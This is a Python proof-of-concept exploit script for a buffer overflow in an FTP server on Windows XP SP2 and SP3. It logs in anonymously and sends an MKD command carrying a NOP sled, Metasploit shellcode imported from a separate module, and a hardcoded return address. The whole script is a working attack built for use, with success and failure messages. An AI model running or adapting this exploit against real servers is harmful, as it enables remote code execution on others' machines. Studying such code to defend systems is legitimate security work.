#!/usr/bin/python
import socket,sys

# Tested on XP Pro SP2 [ Eng ] and XP Pro SP3 [ Eng ]

from payload import buf

def shell_attack(target_machine, target_port):
    target = target_machine
    port = target_port

    # Buffer needed -> 272 bytes
    # Metasploit Shellcode PoC - Calc.exe [ 228 bytes ] [ shikata_ga_nai - 1 iteration ] [ badchars \x00\x0a\x2f\x5c ]

    

    nopsled = b"\x90" * 40
    ret = b"\x10\x3B\x88\00" # MAGIC RET 00883B10 (SP2) / 00893B58 (SP3) [ EBP points to nopsled when overflowed ]
    payload = nopsled + buf + ret 

    print("[+] Launching exploit against " + target + "...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        print("[+] Connected!")
    except:
       
        sys.exit(0)
        
    s.recv(1024)

    # Targetting default user 'anonymous' on the target
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASS anonymous\r\n')
    s.recv(1024)

   
    s.send(b'MKD ' + payload + b'\r\n')


    try:
        s.recv(1024)    
        print("[!] Uhh.. User does not have MKD privilege. +++Exploit failed+++")

    except:
        print("[+] +++Exploit Successful+++ ^_^")

    s.close()